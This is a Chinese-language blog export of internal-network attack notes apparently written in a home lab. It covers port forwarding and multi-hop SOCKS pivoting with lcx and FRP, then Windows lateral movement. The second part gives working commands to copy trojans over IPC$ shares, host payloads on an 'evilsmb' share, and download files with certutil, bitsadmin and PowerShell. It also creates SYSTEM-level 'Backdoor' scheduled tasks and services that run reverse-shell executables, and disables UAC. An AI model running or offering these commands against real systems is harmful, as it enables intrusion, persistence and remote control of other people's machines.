    <url>/2023/03/02/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h1 id="端口转发和代理"><a href="#端口转发和代理" class="headerlink" title="端口转发和代理"></a>端口转发和代理</h1><p>在拿到一个外网主机的权限之后，是无法访问内网资源的</p>
<p>此时就可以使用端口转发和代理技术，来进行访问内网资源</p>
<h2 id="正、反向连接"><a href="#正、反向连接" class="headerlink" title="正、反向连接"></a>正、反向连接</h2><p>正向连接</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">用跳板机主动去连接目标主机<br></code></pre></td></tr></table></figure>



<p>反向连接</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">让目标机来连接跳板机器<br></code></pre></td></tr></table></figure>



<p>内网中多数用到的是反向连接</p>
<p>正向连接容易被目标机器的防火墙拦截，反向连接就不用考虑这种情况</p>
<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p><font color='red'>端口转发</font></p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">把一个端口上收到的数据，转发给另外一个端口<br></code></pre></td></tr></table></figure>



<p>内网中的防火墙和入侵检测设备，会对一些敏感端口进行检测，发现异样就会强制断开通信</p>
<p>利用端口转发技术，可以把端口的资源转发到未被检测的端口</p>
<p><font color='cornflowerblue'>端口映射</font></p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">将外网主机收到的请求映射到内网主机上，使内网主机可以对外提供服务<br></code></pre></td></tr></table></figure>





<h2 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h2><p>socks是一种代理协议</p>
<p>在1080端口</p>
<p>有socks4和socks5两个版本</p>
<p>socks4</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">只支持TCP<br></code></pre></td></tr></table></figure>

<p>socks5</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">socks4协议的升级版本，支持TCP和UDP，还有各种身份验证机制的协议<br></code></pre></td></tr></table></figure>







<h1 id="常见转发与代理工具"><a href="#常见转发与代理工具" class="headerlink" title="常见转发与代理工具"></a>常见转发与代理工具</h1><h2 id="LCX"><a href="#LCX" class="headerlink" title="LCX"></a>LCX</h2><p>古老的端口转发和端口映射工具</p>
<p>但是不能过杀软+-</p>
<h3 id="目标机有公网IP"><a href="#目标机有公网IP" class="headerlink" title="目标机有公网IP"></a>目标机有公网IP</h3><p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/BA8CB706F441202601D65FC20014C6F8.png"  ><span class="image-caption">BA8CB706F441202601D65FC20014C6F8</span></p>
<p>目标机器有公网ip，可以访问</p>
<p>防火墙对3389端口进行了限制</p>
<p>转发到1111端口，需要在目标机器上执行，有些鸡肋</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lcx</span>.exe -tran <span class="hljs-number">1111</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204210911755.png"  ><span class="image-caption">image-20230204210911755</span></p>
<p>然后远程桌面连接</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rdesktop</span> <span class="hljs-number">192.168.232.136:1111</span><br></code></pre></td></tr></table></figure>



<p>这样就突破了防火墙对3389端口的限制</p>
<h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/19630FEDDF5CE8489293FA0DD3E23236.png"  ><span class="image-caption">19630FEDDF5CE8489293FA0DD3E23236</span></p>
<p>基本模型如图</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">可控的攻击机kali<br><br>公网可以访问的机器wi<span class="hljs-symbol">n10</span><br><br>内网机器wi<span class="hljs-symbol">n7</span><br></code></pre></td></tr></table></figure>

<p>如果现在攻陷了win10，要访问win7，直接访问是不可能的</p>
<p>现在就需要做一个事情叫<font color='red'>端口映射</font></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">需要将wi<span class="hljs-symbol">n7</span>的端口（比如<span class="hljs-number">1111</span>）映射到wi<span class="hljs-symbol">n10</span>的端口（比如<span class="hljs-number">2222</span>）<br></code></pre></td></tr></table></figure>



<p>需要在win10上执行如下命令</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#将win7的1111端口映射到win10的2222端口</span><br><span class="hljs-attribute">lcx</span>.exe -tran <span class="hljs-number">2222</span> <span class="hljs-number">11.11.11.11</span> <span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure>



<p>连接win10的2222端口，即可访问到win7，<font color='red'>前提是拿到win10的ssh凭据</font></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#ssh远程连接</span><br><span class="hljs-attribute">ssh</span> root@<span class="hljs-number">10.10.10.9</span> -p <span class="hljs-number">2222</span><br></code></pre></td></tr></table></figure>





<h3 id="目标机器无公网IP"><a href="#目标机器无公网IP" class="headerlink" title="目标机器无公网IP"></a>目标机器无公网IP</h3><p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/239A4609017AADF848A8289F083E543E.png"  ><span class="image-caption">239A4609017AADF848A8289F083E543E</span></p>
<p>模型如上</p>
<p>一台不在公网的主机win10，已经被我们攻陷了，现在想要远程桌面连接它</p>
<p>但是不在公网，我们访问不到</p>
<p>这时就需要我们的VPS</p>
<p>首先监听VPS的1111端口，将2222端口的信息发给1111端口</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">./lcx</span> <span class="hljs-string">-listen</span> <span class="hljs-number">1111 </span><span class="hljs-number">2222</span><br></code></pre></td></tr></table></figure>



<p>然后在win10主机上执行命令，让win10主机的3389端口转发到VPS的2222端口</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">lcx.exe -slave <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> <span class="hljs-number">2222</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure>



<p>最后连接VPS的1111端口即可访问win10的远程桌面</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">rdesktop <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>:<span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure>





<h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p>FRP反向代理</p>
<p>分为服务端和客户端</p>
<p>支持TCP、UDP、HTTP、HTTPS等协议</p>
<p>支持搭建SOCKS5代理</p>
<p>支持windows系统和linux系统</p>
<p>模型</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/D84E5D6982751303D7DC0BD1F33499E8.png"  ><span class="image-caption">D84E5D6982751303D7DC0BD1F33499E8</span></p>
<h3 id="一级网络代理"><a href="#一级网络代理" class="headerlink" title="一级网络代理"></a>一级网络代理</h3><p>前提是获得了win2008的控制器</p>
<p>即kali与win2008的连接代理</p>
<p><font color='red'>VPS作为FRP的服务端</font></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#启动服务端</span><br>.<span class="hljs-regexp">/frps -c ./</span>frps.ini<br></code></pre></td></tr></table></figure>

<p>VPS服务端配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>          <span class="hljs-comment">#服务端绑定的ip地址</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span>             <span class="hljs-comment">#服务端绑定的端口</span><br></code></pre></td></tr></table></figure>



<p><font color='red'>win2008作为客户端</font></p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#启动客户端</span><br>.<span class="hljs-string">\frpc.exe</span> -c .<span class="hljs-string">\frpc.ini</span><br></code></pre></td></tr></table></figure>

<p>客户端配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = x.x.x.x       <span class="hljs-comment">#服务端地址</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span>          <span class="hljs-comment">#服务端的端口</span><br><br><span class="hljs-section">[socks5]</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1080</span>          <span class="hljs-comment">#代理使用的端口，会转发到服务端</span><br><span class="hljs-attr">plugin</span> = socks5             <span class="hljs-comment">#代理类型</span><br></code></pre></td></tr></table></figure>



<p>这就成功搭建了VPS与win2008的一个socks5代理</p>
<p><font color='red'>在kali上使用这个代理</font></p>
<p>使用proxychains</p>
<p>配置文件地址</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>proxychains4.conf<br></code></pre></td></tr></table></figure>

<p>在配置文件最后一行加上</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">socks<span class="hljs-number">5</span> <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204231303622.png"  ><span class="image-caption">image-20230204231303622</span></p>
<p>在命令之前加上proxychains，就可以使用代理</p>
<h3 id="二级网络代理"><a href="#二级网络代理" class="headerlink" title="二级网络代理"></a>二级网络代理</h3><p>当我们拿到win2012的权限之后，发现还存在192.168.10.0/24这个网段</p>
<p>需要搭建一个隧道才能访问，工作区</p>
<p>首先还是vps启动服务端</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#启动服务端</span><br>.<span class="hljs-regexp">/frps -c ./</span>frps.ini<br></code></pre></td></tr></table></figure>

<p>vps服务端配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>          <span class="hljs-comment">#服务端绑定的ip地址</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span>             <span class="hljs-comment">#服务端绑定的端口</span><br></code></pre></td></tr></table></figure>



<p>在win2008执行客户端</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#启动客户端</span><br>.<span class="hljs-string">\frpc.exe</span> -c .<span class="hljs-string">\frpc.ini</span><br></code></pre></td></tr></table></figure>

<p>win2008客户端配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = x.x.x.x       <span class="hljs-comment">#服务端地址</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span>          <span class="hljs-comment">#服务端的端口</span><br><br><span class="hljs-section">[socks5_foward]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">1111</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1080</span>          <span class="hljs-comment">#代理使用的端口，会转发到服务端</span><br></code></pre></td></tr></table></figure>



<p>在win2008作为服务端</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">.<span class="hljs-string">\frps.exe</span> -c .<span class="hljs-string">\frps.ini</span><br></code></pre></td></tr></table></figure>

<p>服务端配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span>      <span class="hljs-comment">#服务端绑定的ip地址</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span>             <span class="hljs-comment">#服务端绑定的端口</span><br></code></pre></td></tr></table></figure>





<p>在win2012上执行客户端</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">.<span class="hljs-string">\frpc.exe</span> -c .<span class="hljs-string">\frpc.ini</span><br></code></pre></td></tr></table></figure>

<p>客户端配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span>   <span class="hljs-comment">#服务端地址</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span>          <span class="hljs-comment">#服务端的端口</span><br><br><span class="hljs-section">[socks5]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1111</span><br><span class="hljs-attr">plugin</span> = socks5<br></code></pre></td></tr></table></figure>





<h3 id="三级网络代理"><a href="#三级网络代理" class="headerlink" title="三级网络代理"></a>三级网络代理</h3><p>同上</p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网学习</tag>
        <tag>端口转发</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>win to win横向</title>
    <url>/2023/03/02/win%20to%20win%E6%A8%AA%E5%90%91/</url>
    <content><![CDATA[<h1 id="横向移动中如何文件传输"><a href="#横向移动中如何文件传输" class="headerlink" title="横向移动中如何文件传输"></a>横向移动中如何文件传输</h1><p>对目标机器的文件进行读取、下载、上传</p>
<h2 id="网络共享"><a href="#网络共享" class="headerlink" title="网络共享"></a>网络共享</h2><p>windows的网络共享功能，可以实现局域网内机器之间的网络共享</p>
<p>提供相关的认证凭据，就可以实现文件共享</p>
<p>windows默认的文件共享包括，<font color='red'>C、D、E…..这些磁盘、ADMIN系统目录、IPC（满足进程之间的通信）</font></p>
<p>查看共享文件</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230117180044802.png"  ><span class="image-caption">image-20230117180044802</span></p>
<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>我们主要用到的就是IPC共享</p>
<p>建立IPC共享的条件</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">开放<span class="hljs-number">139</span>端口    <span class="hljs-meta">#用于共享文件、打印机</span><br><br>开放<span class="hljs-number">445</span>端口     <span class="hljs-meta">#共享文件、打印机</span><br><br>关闭防火墙    <span class="hljs-meta">#有待证明，下面有讲到</span><br></code></pre></td></tr></table></figure>



<p>建立IPC连接</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><code class="hljs elixir">net <span class="hljs-keyword">use</span> \\ip地址\<span class="hljs-title class_">IPC</span><span class="hljs-variable">$ </span><span class="hljs-string">&quot;密码&quot;</span> /<span class="hljs-symbol">user:</span><span class="hljs-string">&quot;用户名&quot;</span><br></code></pre></td></tr></table></figure>



<p>查看C盘文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\ip地址\C<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>

<p>如果对方仅仅只开启了IPC文件共享，那么建立IPC连接是可以成功的，但是无法访问文件</p>
<p>连接成功之后就可以上传木马，将本机的木马上传到对方的C盘</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">copy C:<span class="hljs-string">\Users\wo\Desktop\hobbyhorse_x64.exe</span> <span class="hljs-string">\\192.168.232.132\C$</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230117183445671.png"  ><span class="image-caption">image-20230117183445671</span></p>
<p>然后提供创建计划任务或者其他方法来执行文件</p>
<p>计划任务</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> <span class="hljs-string">&quot;计划名字&quot;</span> <span class="hljs-string">/tr</span> c:\artifact.exe（执行的进程的绝对路径） <span class="hljs-string">/sc</span> once <span class="hljs-string">/st</span> 16<span class="hljs-function">:11</span>（时间） <span class="hljs-string">/s</span> 192.168.10.8 <span class="hljs-string">/RU</span> System<br></code></pre></td></tr></table></figure>

<p>然后就会返回shell</p>
<h3 id="常用的IPC命令"><a href="#常用的IPC命令" class="headerlink" title="常用的IPC命令"></a>常用的IPC命令</h3><figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">查看开启的共享<br><span class="hljs-keyword">net</span> share<br> <br>删除某个共享<br><span class="hljs-keyword">net</span> share c$ /del<br> <br>恢复共享<br><span class="hljs-keyword">net</span> share c$=c:<br> <br>建立共享连接<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.52.143\c$ 123.com  /user:administrator<br> <br>使用域账号建立共享连接<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.52.143\c$ 域账户密码  /user:域名\域账户<br> <br>查看本机已建立的共享<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span><br> <br>查看远程主机的文件<br><span class="hljs-keyword">dir</span> \\192.168.52.143\c$<br><span class="hljs-keyword">dir</span> \\192.168.52.143\c$\xx文件夹<br> <br>复制文件到主机c盘下<br><span class="hljs-keyword">copy</span>  文件名  \\ip\c$<br> <br>删除本机所有已建立的连接 <br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> * /del /y<br> <br>将c盘映射到本地自定义z盘<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> z: \\ip\c$<br> <br>删除映射的磁盘<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> z: /del<br></code></pre></td></tr></table></figure>





<h2 id="SMB服务器"><a href="#SMB服务器" class="headerlink" title="SMB服务器"></a>SMB服务器</h2><p>SMB服务</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">SMB服务主要功能是<br>共享   文件、打印机、串行端口、通新   等资源<br></code></pre></td></tr></table></figure>



<p>在自己的服务器上，搭建SMB服务</p>
<p>然后将要传输的文件，放到SMB的共享目录，并且指定UNC路径</p>
<p>需要<font color='red'>开启SMB匿名共享</font></p>
<p>然后让目标机器远程加载</p>
<p>利用impacket工具包开启</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">mkdir <span class="hljs-regexp">/root/</span>share                <span class="hljs-comment">#创建共享目录</span><br>python smbserver.py evilsmb <span class="hljs-regexp">/root/</span>share -smb2support     <span class="hljs-comment">#创建名为evilsmb的匿名共享</span><br></code></pre></td></tr></table></figure>





<h2 id="windows自带工具"><a href="#windows自带工具" class="headerlink" title="windows自带工具"></a>windows自带工具</h2><p>Windows自带的一些工具也是可以进行文件传输的</p>
<p>都是通过下载服务器上面布置的恶意文件，到本地目录下</p>
<h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><p>是一款Windows管理证书的工具，作为证书服务的一部分安装</p>
<p><font color='red'>支持从网络中下载文件的功能</font></p>
<p>思路：在目标机器上面执行certutil命令，进行下载服务器上面预先设置的木马文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell">certutil <span class="hljs-literal">-urlcache</span> <span class="hljs-operator">-split</span> <span class="hljs-operator">-f</span> 服务器地址 + 保存的地址目录<br></code></pre></td></tr></table></figure>





<h3 id="BITSAdmin"><a href="#BITSAdmin" class="headerlink" title="BITSAdmin"></a>BITSAdmin</h3><p>win7以后的系统自带bitsadmin工具</p>
<p>用于创建、下载、上传作业</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">bitsadmin /transfer <span class="hljs-built_in">test</span> 地址 保存目录<br></code></pre></td></tr></table></figure>





<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p>这个工具就比较熟悉了</p>
<p>通过创建webclient对象，来实现下载文件</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">(<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;地址&#x27;</span>,<span class="hljs-string">&#x27;保存地址&#x27;</span>)<br></code></pre></td></tr></table></figure>







<h1 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h1><p>在有目标机管理员凭据的前提下，可以使用计划任务</p>
<p>首先建立IPC连接</p>
<p>然后利用IPC连接，来上传木马</p>
<p>最后创建计划任务，来执行木马</p>
<p>命令</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/Create /</span>S <span class="hljs-number">192.168</span>.<span class="hljs-number">232.130</span> <span class="hljs-regexp">/TN Backdoor /</span>SC minute <span class="hljs-regexp">/MO 1 /</span>TR C:\reverse_tcp.exe <span class="hljs-regexp">/RU System /</span>F <span class="hljs-regexp">/U Administrator /</span>p admin123<br></code></pre></td></tr></table></figure>

<p>/U    /P是在没有建立IPC连接的情况下使用的</p>
<p>/S：指定要连接的系统</p>
<p>/TN：指定要创建的计划任务的名称</p>
<p>/SC：指定计划任务执行频率</p>
<p>/MO：指定计划任务执行周期</p>
<p>/TR：指定计划任务运行的程序路径</p>
<p>/RU：指定计划任务运行的用户权限</p>
<p>/F：如果指定的任务已经存在，则强制创建</p>
<p>然后可以直接执行计划</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/RUN /</span>S ip地址 <span class="hljs-regexp">/I /</span>TN Backdoor<br></code></pre></td></tr></table></figure>



<p>也可以通过计划任务来执行主机命令，并且保存结果，然后远程读取</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/Create /</span>S <span class="hljs-number">192.168</span>.<span class="hljs-number">232.130</span> <span class="hljs-regexp">/TN Backdoor /</span>SC minute <span class="hljs-regexp">/MO 1 /</span>TR :<span class="hljs-string">&quot;C:\windows\system32\cmd.exe /c &#x27;whoami &gt; C:\result.txt&#x27;&quot;</span> <span class="hljs-regexp">/RU System /</span>f<br><br>type \\ip地址\C$\result.txt<br></code></pre></td></tr></table></figure>



<p>删除计划</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/Delete /</span>S ip地址 <span class="hljs-regexp">/TN Backdoor /</span>F<br></code></pre></td></tr></table></figure>



<p>还有一种创建计划任务的方式就是at</p>
<p><font color='red'>在小于win2012使用，schtasks是在高版本的windows使用的</font></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">at</span> \\<span class="hljs-number">192.168.3.21</span> <span class="hljs-number">15</span>:<span class="hljs-number">47</span> c:\add.bat<br></code></pre></td></tr></table></figure>

<p>删除</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">at</span> \\<span class="hljs-number">192.168.3.21</span> <span class="hljs-number">2</span> /delete           #<span class="hljs-number">2</span>是计划任务的id<br></code></pre></td></tr></table></figure>





<h2 id="实操失败"><a href="#实操失败" class="headerlink" title="实操失败"></a>实操失败</h2><p>攻击机win10</p>
<p>目标机win7    win2008</p>
<p>目标机是域用户</p>
<p>我在win10上面向win7用schtasks写入计划任务无法成功</p>
<p>一直显示拒绝访问</p>
<p>但是IPC可以正常连接，并且正常访问</p>
<p>用at写入命令就可以正常执行</p>
<p>解决方法如下</p>
<h2 id="实操成功"><a href="#实操成功" class="headerlink" title="实操成功"></a>实操成功</h2><p>上面的问题已经解决</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/Create /</span>S <span class="hljs-number">192.168</span>.<span class="hljs-number">232.130</span> <span class="hljs-regexp">/TN Backdoor /</span>SC minute <span class="hljs-regexp">/MO 1 /</span>TR C:\reverse_tcp.exe <span class="hljs-regexp">/RU System /</span>F     <span class="hljs-comment">#未加凭据</span><br><br>schtasks <span class="hljs-regexp">/Create /</span>S <span class="hljs-number">192.168</span>.<span class="hljs-number">232.130</span> <span class="hljs-regexp">/TN Backdoor /</span>SC minute <span class="hljs-regexp">/MO 1 /</span>TR C:\reverse_tcp.exe <span class="hljs-regexp">/RU System /</span>F <span class="hljs-regexp">/U Administrator /</span>p admin123                <span class="hljs-comment">#加上凭据</span><br></code></pre></td></tr></table></figure>



<p>书上说，建立ipc连接之后，是不需要加凭据的</p>
<p>但是</p>
<p>实操是需要加上凭据的，不然一直报错</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202124326341.png"  ><span class="image-caption">image-20230202124326341</span></p>
<p><strong><font color='red'>主要是，目标机器会开启UAC，此时就无法执行计划任务</font></strong></p>
<figure class="highlight moonscript"><table><tr><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System    #路径下的EnableLUA参数，修改为<span class="hljs-number">0</span>，即关闭UAC<br></code></pre></td></tr></table></figure>

<p>但是</p>
<p><strong><font color='red'>只要是administrator用户登陆，是否开启UAC，毫无影响</font></strong></p>
<h2 id="UNC路径加载执行"><a href="#UNC路径加载执行" class="headerlink" title="UNC路径加载执行"></a>UNC路径加载执行</h2><p>我们一般的思路都是尝试尽可能的把payload<font color='red'>上传</font>到目标机，但是过程肯定是有些艰难的</p>
<p>还有一个思路就是远程执行</p>
<h3 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h3><figure class="highlight moonscript"><table><tr><td class="code"><pre><code class="hljs moonscript">\\servername\sharename\directory\filename                其中servername是服务器名、sharename是共享资源的名称、后面就是文件夹和文件<br></code></pre></td></tr></table></figure>

<p>简而言之就是网络上的资源，并不是本地资源</p>
<h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><p>比较简单，就是利用UNC路径加载远程资源</p>
<p>自己搭建一个SMB服务器，并且上传payload，SMB需要设置匿名共享</p>
<p>然后创建计划任务，使用UNC加载远程服务器上的payload</p>
<p>kali为smb服务端</p>
<p>kali linux 为msf监听端</p>
<p>win10为已经攻陷的主机</p>
<p>win7为另外一台待横向主机</p>
<p><font color='red'>配置smb服务端</font></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">mkdir <span class="hljs-regexp">/root/</span>share                <span class="hljs-comment">#创建共享目录</span><br>python smbserver.py evilsmb <span class="hljs-regexp">/root/</span>share -smb2support     <span class="hljs-comment">#创建名为evilsmb的匿名共享</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202131446915.png"  ><span class="image-caption">image-20230202131446915</span></p>
<p>记得把木马文件放到 /root/share文件夹</p>
<p><font color='cornflowerblue'>配置监听</font></p>
<p>msf开启监听</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202131604093.png"  ><span class="image-caption">image-20230202131604093</span></p>
<p><font color='orange'>win10操作</font></p>
<p>创建计划任务</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/Create /</span>S <span class="hljs-number">192.168</span>.<span class="hljs-number">232.128</span> <span class="hljs-regexp">/TN Backdoor /</span>SC minute <span class="hljs-regexp">/MO 1 /</span>TR \\<span class="hljs-number">192.168</span>.<span class="hljs-number">232.152</span>\evilsmb\hobbyhorse_x64.exe <span class="hljs-regexp">/RU System /</span>F <span class="hljs-regexp">/U liukaifeng01 /</span>P admin                    <br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202132027206.png"  ><span class="image-caption">image-20230202132027206</span></p>
<p>之后发现主机上线</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202132101178.png"  ><span class="image-caption">image-20230202132101178</span></p>
<p>成功</p>
<h1 id="利用系统服务"><a href="#利用系统服务" class="headerlink" title="利用系统服务"></a>利用系统服务</h1><h2 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h2><p>个人觉得和创建计划任务差不多</p>
<p><font color='red'>建立共享连接，向远程主机上传攻击载荷</font></p>
<p><font color='cornflowerblue'>利用已经建立的ipc连接，来创建系统服务</font></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">232</span>.<span class="hljs-number">128</span> create <span class="hljs-keyword">Backdoor </span><span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;cmd.exe /k E:\hobbyhorse_x64.exe&quot;</span><br></code></pre></td></tr></table></figure>



<p><font color='orange'>启动创建的服务</font></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sc</span> \\<span class="hljs-number">192.168.232.128</span> start Backdoor<br></code></pre></td></tr></table></figure>

